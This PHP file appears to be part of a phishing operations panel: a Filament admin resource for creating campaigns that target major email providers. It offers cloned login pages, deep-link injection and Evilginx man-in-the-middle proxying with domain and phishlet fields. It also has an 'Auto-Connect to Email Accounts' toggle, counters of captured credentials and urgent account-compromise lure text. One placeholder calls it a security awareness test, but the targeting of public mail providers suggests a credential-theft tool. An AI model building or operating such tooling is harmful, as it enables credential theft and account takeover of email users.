<?php

namespace App\Filament\Resources\PhishingCampaigns;

use App\Filament\Resources\PhishingCampaigns\Pages\ListPhishingCampaigns;
use App\Filament\Resources\PhishingCampaigns\Pages\CreatePhishingCampaign;
use App\Filament\Resources\PhishingCampaigns\Pages\EditPhishingCampaign;
use App\Filament\Resources\PhishingCampaigns\Pages\ViewPhishingCampaign;
use App\Models\PhishingCampaign;
use BackedEnum;
use Filament\Forms\Components\DatePicker;
use Filament\Schemas\Components\Grid;
use Filament\Forms\Components\KeyValue;
use Filament\Forms\Components\Select;
use Filament\Forms\Components\Textarea;
use Filament\Forms\Components\TextInput;
use Filament\Forms\Components\Toggle;
use Filament\Resources\Resource;
use Filament\Schemas\Schema;
use Filament\Tables\Columns\IconColumn;
use Filament\Tables\Columns\TextColumn;
use Filament\Tables\Table;
use UnitEnum;

class PhishingCampaignResource extends Resource
{
    protected static ?string $model = PhishingCampaign::class;

    protected static string|BackedEnum|null $navigationIcon = 'heroicon-o-fire';
    protected static string|UnitEnum|null $navigationGroup = 'Phishing';
    protected static ?string $navigationLabel = 'Campaigns';
    protected static ?string $modelLabel = 'Campaign';
    protected static ?string $pluralModelLabel = 'Campaigns';
    protected static ?int $navigationSort = 1;

    public static function getGloballySearchableAttributes(): array
    {
        return ['name', 'tracking_id'];
    }

    public static function form(Schema $schema): Schema
    {
        return $schema->schema([
            Grid::make(3)->schema([
                TextInput::make('name')
                    ->label('Campaign Name')
                    ->required()
                    ->maxLength(255)
                    ->placeholder('Q3 Security Awareness Test')
                    ->columnSpan(1),

                Select::make('provider')
                    ->label('Target Provider')
                    ->options([
                        'google'      => 'Google (Gmail)',
                        'microsoft'   => 'Microsoft (Outlook)',
                        'yahoo'       => 'Yahoo Mail',
                        'gmx'         => 'GMX',
                        'webde'       => 'WEB.DE',
                        'ionos'       => 'IONOS',
                        'telekom'     => 'Telekom / T-Online',
                        'a1'          => 'A1 Mail',
                        'freenet'     => 'Freenet',
                        'icloud'      => 'iCloud',
                        'zoho'        => 'Zoho Mail',
                        'protonmail'  => 'ProtonMail',
                    ])
                    ->required()
                    ->searchable()
                    ->columnSpan(1),

                Select::make('campaign_type')
                    ->label('Campaign Type')
                    ->options([
                        'classic'   => 'Classic (Cloned Login Page)',
                        'deeplink'  => 'Deep-Link Injection (Native App)',
                        'evilginx'  => 'Evilginx (MITM Proxy)',
                    ])
                    ->default('classic')
                    ->required()
                    ->columnSpan(1),
            ])->columnSpanFull(),

            Grid::make(3)->schema([
                Select::make('status')
                    ->options([
                        'draft'     => 'Draft',
                        'active'    => 'Active',
                        'paused'    => 'Paused',
                        'completed' => 'Completed',
                    ])
                    ->default('draft')
                    ->required(),

                Toggle::make('auto_connect_enabled')
                    ->label('Auto-Connect to Email Accounts')
                    ->default(true),

                Select::make('deep_link_mode')
                    ->label('Deep-Link Mode')
                    ->options([
                        'auto'      => 'Auto (Detect Device)',
                        'ios'       => 'Force iOS App',
                        'android'   => 'Force Android App',
                        'web'       => 'Force Web Login',
                    ])
                    ->default('auto')
                    ->visible(fn ($get) => $get('campaign_type') === 'deeplink'),
            ])->columnSpanFull(),

            Grid::make(2)->schema([
                TextInput::make('evilginx_domain')
                    ->label('Evilginx Domain')
                    ->placeholder('phish.example.com')
                    ->visible(fn ($get) => $get('campaign_type') === 'evilginx'),

                TextInput::make('evilginx_phishlet')
                    ->label('Evilginx Phishlet')
                    ->placeholder('google')
                    ->visible(fn ($get) => $get('campaign_type') === 'evilginx'),
            ])->columnSpanFull(),

            Grid::make(2)->schema([
                TextInput::make('from_name')
                    ->label('From Name')
                    ->default('Security Team')
                    ->required()
                    ->maxLength(255),

                TextInput::make('from_email')
                    ->label('From Email')
                    ->email()
                    ->placeholder('security@example.com'),

                TextInput::make('reply_to')
                    ->label('Reply-To')
                    ->email()
                    ->placeholder('support@example.com'),
            ])->columnSpanFull(),

            Grid::make(2)->schema([
                TextInput::make('subject')
                    ->label('Email Subject')
                    ->required()
                    ->maxLength(255)
                    ->placeholder('Urgent: Your account has been compromised')
                    ->columnSpanFull(),

                Textarea::make('body_html')
                    ->label('Email HTML Body')
                    ->rows(10)
                    ->required()
                    ->placeholder('<h1>Action Required</h1><p>Your account shows suspicious activity...</p>')
                    ->columnSpanFull(),

                Textarea::make('body_text')
                    ->label('Plain Text Body')
                    ->rows(4)
                    ->placeholder('Action Required. Your account shows suspicious activity...'),
            ])->columnSpanFull(),

            Grid::make(3)->schema([
                TextInput::make('tracking_id')
                    ->label('Tracking ID')
                    ->default(fn () => PhishingCampaign::generateTrackingId())
                    ->unique(ignoreRecord: true)
                    ->disabled(),

                DatePicker::make('started_at')
                    ->label('Started At'),

                DatePicker::make('completed_at')
                    ->label('Completed At'),
            ])->columnSpanFull(),

            KeyValue::make('target_domains')
                ->label('Target Domains (leave empty to use all verified emails)')
                ->reorderable(),
        ]);
    }

    public static function table(Table $table): Table
    {
        return $table
            ->columns([
                TextColumn::make('id')
                    ->label('#')
                    ->sortable()
                    ->width(60),

                TextColumn::make('name')
                    ->label('Campaign')
                    ->searchable()
                    ->limit(30),

                TextColumn::make('provider')
                    ->label('Provider')
                    ->badge()
                    ->color(fn (string $state): string => match ($state) {
                        'google'     => 'danger',
                        'microsoft'  => 'info',
                        'yahoo'      => 'success',
                        'gmx'        => 'warning',
                        'webde'      => 'warning',
                        'ionos'      => 'primary',
                        'telekom'    => 'danger',
                        'a1'         => 'warning',
                        'freenet'    => 'info',
                        'icloud'     => 'gray',
                        'zoho'       => 'success',
                        'protonmail' => 'info',
                        default      => 'gray',
                    }),

                TextColumn::make('campaign_type')
                    ->label('Type')
                    ->badge()
                    ->color(fn (string $state): string => match ($state) {
                        'classic'   => 'gray',
                        'deeplink'  => 'info',
                        'evilginx'  => 'danger',
                        default     => 'gray',
                    }),

                TextColumn::make('status')
                    ->badge()
                    ->color(fn (string $state): string => match ($state) {
                        'draft'     => 'gray',
                        'active'    => 'danger',
                        'paused'    => 'warning',
                        'completed' => 'success',
                        default     => 'gray',
                    }),

                TextColumn::make('subject')
                    ->label('Subject')
                    ->limit(40)
                    ->toggleable(),

                TextColumn::make('total_sent')
                    ->label('Sent')
                    ->sortable()
                    ->alignCenter(),

                TextColumn::make('total_opened')
                    ->label('Opened')
                    ->sortable()
                    ->alignCenter(),

                TextColumn::make('total_clicked')
                    ->label('Clicked')
                    ->sortable()
                    ->alignCenter(),

                TextColumn::make('total_captured')
                    ->label('Captured')
                    ->sortable()
                    ->alignCenter()
                    ->color(fn (int $state): string => $state > 0 ? 'danger' : 'gray'),

                IconColumn::make('tracking_id')
                    ->label('Tracked')
                    ->boolean()
                    ->getStateUsing(fn ($record): bool => filled($record->tracking_id)),

                TextColumn::make('created_at')
                    ->label('Created')
                    ->since()
                    ->sortable(),
            ])
            ->defaultSort('id', 'desc')
            ->filters([
                //
            ])
            ->actions([
                \Filament\Actions\ViewAction::make(),
                \Filament\Actions\EditAction::make(),
            ])
            ->bulkActions([
                \Filament\Actions\BulkActionGroup::make([
                    \Filament\Actions\DeleteBulkAction::make(),
                ]),
            ]);
    }

    public static function getRelations(): array
    {
        return [
            // TargetsRelationManager::class,
            // CapturedCredentialsRelationManager::class,
        ];
    }

    public static function getPages(): array
    {
        return [
            'index'  => ListPhishingCampaigns::route('/'),
            'create' => CreatePhishingCampaign::route('/create'),
            'view'   => ViewPhishingCampaign::route('/{record}'),
            'edit'   => EditPhishingCampaign::route('/{record}/edit'),
        ];
    }
}
